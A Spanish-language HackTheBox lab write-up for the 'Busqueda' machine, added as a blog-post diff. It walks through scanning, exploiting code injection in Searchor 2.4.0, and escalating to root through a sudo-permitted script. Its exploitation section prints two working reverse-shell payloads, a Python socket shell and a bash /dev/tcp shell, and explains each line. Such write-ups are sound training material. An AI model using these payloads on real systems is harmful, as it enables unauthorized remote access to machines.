@@ -1,0 +1,164 @@
+---
+title: Busqueda
+date: '2023-08-12'
+lastmod: '2023-08-05'
+tags: ['labs', 'HackTheBox']
+draft: false
+summary: 'Busqueda es una maquina sencilla en la cual debemos explotar la vulnerabilidad de Searchor 2.4.0 para una vez dentro ingeniarnosla y escalar privilegios'
+images: ['/static/images/htb/busqueda/busqueda.png']
+---
+
+![Portada](/static/images/htb/busqueda/busqueda.png)
+
+<TOCInline toc={props.toc} exclude="Introduccion" />
+
+## RECONOCIMIENTO
+
+### Ping
+
+Primero que nada verificamos estar en la misma red que la maquina victima enviandole un paquete de datos a la ip 10.10.11.208 con el comando ping.
+
+```js
+  ping -c 4 10.10.11.208
+```
+
+- `-c` : Cantidad de paquetes de solicitud de eco ICMP (Internet Control Message Protocol) que se enviaran.
+
+![Ping](/static/images/htb/busqueda/ping.png)
+
+### Nmap
+
+```js
+  sudo nmap -sV -sS --min-rate 5000 10.10.11.208 -O
+```
+
+![Nmap](/static/images/htb/busqueda/nmap.png)
+
+### Puertos abiertos
+
+| Puertos abiertos | Servicio | Version             |
+| ---------------- | -------- | ------------------- |
+| **_22/tcp_**     | ssh      | OpenSSH 8.9p1       |
+| **_80/tcp_**     | http     | Apache httpd 2.4.52 |
+
+## ENUMERACION
+
+### Puerto 80
+
+Nos dirigimos a la web page y nos topamos con Searcher.
+![web](/static/images/htb/busqueda/web1.png)
+Bajamos y nos encontramos con un formulario e informacion acerca de la aplicacion. Vemos que
+esta utilisando [Flask](https://flask.palletsprojects.com/en/2.3.x/) y [Searchor 2.4.0](https://pypi.org/project/searchor/)
+![web](/static/images/htb/busqueda/web2.png)
+
+Realizando una busqueda en Google sobre Searchor version 2.4.0 nos encontramos con que es vulnerable a [ejecucion de codigo](https://security.snyk.io/package/pip/searchor/2.4.0).
+Encontramos dos repositorios de PoC en los cuales apoyarnos para realizar la explotacion.
+Vamos a hacer la demostracion de dos maneras distinas pero que nos van a conducir al mismo resultado.
+
+### Manera 1
+
+Abrimos Burpsuite y activamos Foxyproxy para capturar todas las solicitudes que realizemos.
+Ponemos un puerto de nuestra maquina en escucha.
+![web](/static/images/htb/busqueda/web4.png)
+
+Damos click en el boton Search.
+![web](/static/images/htb/busqueda/web3.png)
+
+En Burpsuite, capturamos la peticion y la mandamos al repeater.
+![web](/static/images/htb/busqueda/web5.png)
+
+Una vez alli, en el campo query, colocamos la siguiente linea de codigo:
+
+```python
+', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('TU_IP',PUERTO));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
+```
+
+Vamos a desglozar lo que hace:
+
+Esta línea de código es un ejemplo de un shell reverso en Python, que se utiliza comúnmente en pruebas de penetración y actividades maliciosas para obtener acceso remoto a un sistema. Vamos a desglosar lo que hace:
+
+`import socket,subprocess,os`: Importa los módulos necesarios. _socket_ para la comunicación de red, _subprocess_ para ejecutar comandos y _os_ para interactuar con el sistema operativo.
+
+`s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)`: Crea un nuevo objeto de socket para la comunicación _TCP/IP_.
+
+`s.connect(('TU_IP',PUERTO))`: Intenta conectar el socket al IP y puerto especificados. Nota: '_TU_IP_' y '_PUERTO_' son marcadores de posición y deben ser reemplazados por una dirección IP y un puerto válidos respectivamente.
+
+`os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);`: Estas tres líneas redirigen la entrada estándar (0), la salida estándar (1) y la salida de error estándar (2) del proceso al socket. Esto significa que cualquier entrada o salida del proceso se enviará a través del socket, permitiendo la interacción remota.
+
+`p=subprocess.call(['/bin/sh','-i'])`: Ejecuta una shell (_/bin/sh_) con una opción _-i_ que indica que se debe ejecutar en modo interactivo. Esto permite que el atacante ejecute comandos en el sistema comprometido.
+
+Damos click derecho sobre la linea de codigo y la URLencodeamos. Hacemos los cambios pertinentes, colocando nuestra IP y el puerto que tengamos levantado en escucha. Enviamos y recibiremos una shell en donde teniamos nuestro netcat en escucha.
+![web](/static/images/htb/busqueda/web6.png)
+
+### Manera 2
+
+De la manera 2 tambien ponemos un puerto de nuestra maquina en escucha.
+![web](/static/images/htb/busqueda/altweb.png)
+Pero en este caso, no interceptamos la solicitud, directamente
+colocamos la reverse shell en el campo del formulario y la enviamos.
+
+```python
+'),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')
+```
+
+Esta línea de código es otra variante de un shell reverso, pero esta vez utilizando una combinación de Python y Bash para obtener acceso remoto a un sistema. Desglosemos lo que hace:
+
+`__import__('os')`: Esta es una forma alternativa en Python para importar un módulo, en este caso, el módulo os.
+
+`.system(...)`: Es una función del módulo os que se utiliza para ejecutar comandos del sistema operativo desde un script de Python.
+
+`'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'`: Este es el comando que se ejecuta. Desglosemos este comando Bash:
+
+`bash -c`: Ejecuta el comando Bash especificado en la cadena que sigue.
+
+`bash -i`: Inicia una nueva instancia de Bash en modo interactivo.
+
+`& /dev/tcp/10.0.0.1/4444`: Redirige la salida estándar de la shell al socket TCP en la dirección IP 10.0.0.1 y el puerto 4444. Bash tiene una característica poco conocida que permite crear conexiones de red utilizando /dev/tcp/HOST/PORT.
+
+`0>&1`: Redirige la entrada estándar (0) al mismo lugar que la salida estándar (1), lo que significa que la entrada y la salida de la shell se enviarán a través de la conexión TCP.
+
+![web](/static/images/htb/busqueda/altweb2.png)
+
+Y recibimos la shell.
+![web](/static/images/htb/busqueda/altweb3.png)
+
+## ESCALADA DE PRIVILEGIOS
+
+Ya dentro, vemos que somos el usuario svc. Donde estamos hay un directorio .git.
+![web](/static/images/htb/busqueda/web7.png)
+
+En el archivo config vemos unas credenciales, volvemos al puerto 22 para probar.
+![web](/static/images/htb/busqueda/web8.png)
+
+Efectivamente, las credenciales son validas.
+![web](/static/images/htb/busqueda/ssh.png)
+
+Ejecutamos el comando `sudo -l`. El comando sudo -l se utiliza en sistemas basados en Unix y Linux para mostrar los privilegios de ejecución específicos que tiene un usuario en relación con los comandos que pueden ejecutar utilizando el comando sudo.
+
+El comando sudo permite a los usuarios ejecutar comandos con los privilegios de superusuario (también conocido como "root"), lo que les brinda acceso a operaciones y configuraciones que normalmente requerirían permisos administrativos. Sin embargo, no todos los usuarios pueden ejecutar cualquier comando con sudo. El archivo de configuración sudoers determina qué comandos y acciones pueden ejecutar los usuarios mediante sudo.
+
+Al usar sudo -l, un usuario puede verificar los comandos y las operaciones específicas que se les permite ejecutar con sudo. Esto es útil para comprender rápidamente el alcance de los privilegios que un usuario tiene sin necesidad de intentar ejecutar comandos y recibir mensajes de error si no se les permite.
+![web](/static/images/htb/busqueda/ssh1.png)
+
+Podemos ejecutar comandos como el usuario con altos privilegios. Vemos que podemos ejecutar el script full-checkup.
+Lo que debemos de hacer es crear un archivo con el mismo nombre y mandar una shell con privilegios de root a nuestra maquina atacante
+![web](/static/images/htb/busqueda/ssh2.png)
+
+En nuestra maquina escribimos un [script de python](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/) que nos dara una reverse shell.
+![web](/static/images/htb/busqueda/ssh3.png)
+
+Luego, levantamos un servidor con python para poder transferirlo a la maquina victima.
+![web](/static/images/htb/busqueda/ssh4.png)
+
+Antes de volver a la maquina victima, abrimos con nc el puerto que pusimos en el script de python para que
+este en escucha. Le damos permisos de ejecucion y lo ejecutamos.
+![web](/static/images/htb/busqueda/ssh5.png)
+
+En nuestra maquina atacante recibimos una shell con maximos privilegios. Consiguiendo asi la flag root.txt .
+![web](/static/images/htb/busqueda/ssh7.png)
+
+`URLs de utilidad:`
+
+- [Python eval code execution](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/)
+
+- [Python privilege escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/)
